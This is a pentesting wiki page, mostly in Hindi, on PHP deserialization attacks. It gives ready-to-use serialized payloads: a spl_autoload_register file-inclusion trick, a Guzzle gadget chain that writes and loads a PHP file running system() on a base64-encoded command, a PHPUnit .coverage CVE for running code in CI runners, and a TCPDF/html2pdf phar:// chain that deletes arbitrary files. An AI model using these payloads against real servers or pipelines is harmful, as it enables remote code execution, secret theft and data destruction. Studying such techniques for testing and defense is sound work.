# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

सबसे पहले, आपको यह देखना चाहिए कि [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) क्या हैं।

## PHP deserialization + spl_autoload_register + LFI/Gadget

हम ऐसी स्थिति में हैं जहाँ हमें एक **PHP deserialization** किसी webapp में मिला है और वर्तमान ऐप में **phpggc** के अंदर gadget के लिए संवेदनशील कोई लाइब्रेरी **नहीं** है। हालाँकि, उसी container में एक अलग composer webapp थी जिसमें संवेदनशील लाइब्रेरी मौजूद थीं। इसलिए लक्ष्य यह था कि दूसरी webapp का **composer loader** लोड किया जाए और उसे अब्यूज़ करके उस लाइब्रेरी को exploit करने वाला एक gadget लोड किया जाए, जो कि deserialization के प्रति संवेदनशील webapp से आएगा।

Steps:

- आपने एक **deserialization** पाया है और वर्तमान ऐप के कोड में **कोई भी gadget मौजूद नहीं है**
- आप निम्न जैसे **`spl_autoload_register`** फ़ंक्शन का उपयोग दुरुपयोग के लिए कर सकते हैं ताकि वह **किसी भी local फ़ाइल को `.php` एक्सटेंशन के साथ लोड कर सके**
- इसके लिए आप एक deserialization उपयोग करते हैं जहाँ क्लास का नाम **`$name`** के अंदर होगा। serialized ऑब्जेक्ट में क्लास नाम में आप **"/" या "."** उपयोग नहीं कर सकते, लेकिन **कोड** अंडरस्कोर ("_") को स्लैश ("/") में **replace** कर रहा है। इसलिए एक क्लास नाम जैसे `tmp_passwd` `/tmp/passwd.php` में बदल जाएगा और कोड उसे लोड करने की कोशिश करेगा.\
एक **gadget example** होगा: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> यदि आपके पास **file upload** है और आप **`.php` extension** वाली फ़ाइल अपलोड कर सकते हैं तो आप इस functionality को सीधे **abuse** करके तुरंत RCE प्राप्त कर सकते हैं।

In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- नोट: जनरेट किया गया gadget काम नहीं कर रहा था; इसे काम में लाने के लिए मैंने phpggc के उस payload **`chain.php`** को संशोधित किया और क्लासेस के सभी **attributes** को **private से public** कर दिया। यदि ऐसा नहीं किया गया, तो string को deserializing करने के बाद बनाए गए objects के attributes में कोई value नहीं आती थी।
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- अब, हम **एक फ़ाइल बना और लिख सकते हैं**, हालांकि, उपयोगकर्ता **वेब सर्वर के किसी भी फ़ोल्डर में लिख नहीं सकता था**। तो, जैसा कि आप payload में देख सकते हैं, PHP जो कुछ **base64** के साथ **`system`** को कॉल करता है, वह **`/tmp/a.php`** में बनाई जाती है। फिर, हम **पहले प्रकार के payload को पुन: उपयोग कर सकते हैं** जिसे हमने LFI के रूप में उपयोग किया था ताकि दूसरे webapp के composer loader को लोड करके t**जनरेट की गई `/tmp/a.php` को लोड करने के लिए** फ़ाइल। बस इसे deserialization gadget में जोड़ें:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**पेलोड का सारांश**

- एक ही कंटेनर में मौजूद दूसरे webapp का **composer autoload** लोड करें
- दूसरे webapp की लाइब्रेरी का दुरुपयोग करने के लिए **phpggc gadget** लोड करें (initial webapp जो deserialization के लिए vulnerable था उसकी लाइब्रेरीज़ में कोई gadget मौजूद नहीं था)
- Gadget `/tmp/a.php` में **create a file with a PHP payload** करेगा जिसमें malicious commands होंगे (webapp user किसी भी webapp के किसी फ़ोल्डर में लिख नहीं सकता)
- हमारे payload का अंतिम हिस्सा **load the generated php file** का उपयोग करेगा जो commands execute करेगा

मुझे इसे **call this deserialization twice** करना पड़ा। मेरे परीक्षण में पहली बार `/tmp/a.php` फ़ाइल बनाई गई लेकिन लोड नहीं हुई, और दूसरी बार वह सही तरीके से लोड हुई।

### Recent phpggc goodies (2025)

- **phpggc master branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 और अन्य 2025 में शामिल हुए — उपयोगी तब जब target app उन projects के साथ vendor code शेयर करता हो। जल्दी से खोजने का तरीका: `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (पहले अपनी clone अपडेट करें)।
- जब autoloading के जरिए apps के बीच gadgets mix करें, ध्यान रखें कि target में classes को अलग तरह से re-declare करने पर **private properties in gadget definitions may be dropped**; अगर payload खाली values के साथ आता है तो gadget की `chain.php` एडिट कर properties को `public` कर दें (उसी trick जैसा ऊपर दिखाया गया है)।

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) ने `.coverage` फाइलों (जो **PHPT runner** द्वारा बनाई जाती हैं) से arbitrary PHP objects को unserialize किया। उन CI pipelines में जहाँ untrusted contributors tests push कर सकते हैं, एक crafted `.coverage` फ़ाइल डालना जैसे ही suite चलती है deserialization ट्रिगर कर देता है — किसी web access की ज़रूरत नहीं।

**Attack flow**

1. repo (या artifact) में एक malicious `.coverage` फ़ाइल रखें जिसमें serialized gadget हो जो test dependencies में मौजूद हो (उदा., phpggc से Monolog या Guzzle chain)।
2. PR सबमिट करें; जब CI `phpunit --configuration phpunit.xml` चलाएगा, PHPT runner coverage फ़ाइल पढ़कर gadget को deserialize कर देता है, जिससे **RCE inside the runner container** मिल जाता है।
3. यह विशेष रूप से ख़तरनाक होता है जब tests CI secrets (cloud creds, deployment keys) mount करते हों।

**Minimal malicious coverage stub** (drop alongside a PHPT test):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
PHPT चलाएँ ताकि phpunit `exploit.coverage` का उपयोग करे।

## TCPDF `__destruct` POP chain किसी भी फ़ाइल को हटाने के लिए

जब एक वास्तविक `TCPDF` instance को garbage-collected किया जाता है, यह `_destroy(true)` को कॉल करता है, `$this->imagekeys` पर इटरेट करता है, और `K_PATH_CACHE` के अंतर्गत किसी भी चीज़ को जो cache फ़ाइल जैसी दिखती है उसे `unlink()` कर देता है। यदि कोई application तब `unserialize($user_data)` चलाता है जब `TCPDF` class लोड है (उदा. यह `html` key वाला array अपेक्षित करता है), तो आप एक serialized object उपलब्ध करवा सकते हैं जो सेट करता है:

- `file_id` को किसी भी integer पर सेट करें जो `self::$cleaned_ids` में मौजूद न हो (उदा. `-1`)।
- `imagekeys` को ऐसे paths पर सेट करें जो `K_PATH_CACHE` से शुरू हों या जिन्हें ऐसा दिखने लायक बनाया जा सके (उदा. `/tmp/../tmp/do_not_delete_this_file.txt` जब `K_PATH_CACHE` `/tmp/` हो)।

उदाहरण payload जो असुरक्षित `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow को लक्षित करता है:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) wraps TCPDF and exposes a custom `<cert>` block whose `src`/`privkey` attributes are validated with plain `file_exists()`. On PHP < 8.0 any filesystem function that touches a `phar://` URL causes the Phar metadata to be unserialized. By storing the malicious TCPDF object above inside a Phar archive you gain a reliable POP even if the application never calls `unserialize()` itself.

1. `phar.readonly=0` के साथ एक Phar तैयार करें, stub/manifest को image जैसा दिखने के लिए सेट करें (उदा. `archive.phar` को `archive.png` में rename करें), और serialized TCPDF object को Phar के metadata में स्टोर करें।
2. फाइल को किसी पहुँच योग्य स्थान पर upload/place करें, जैसे `/tmp/user_files/user_1/archive.png`।
3. html2pdf उस हमलावर-नियंत्रित path को resolve करने के लिए `<cert>` टैग वाला HTML submit करें:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` कॉल मेटाडेटा को deserialize करती है, TCPDF का instance बनाती है, और इसका destructor चुनी हुई फ़ाइल को delete कर देता है, जिससे html2pdf एक शक्तिशाली `phar://` एंट्री पॉइंट बन जाता है। Version 5.3.1 ने अनुमोदित नहीं किए गए schemes को ब्लॉक करने के लिए `Security::checkValidPath()` जोड़ा, इसलिए legacy deployments अभी भी आकर्षक बने हुए हैं।

## संदर्भ

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
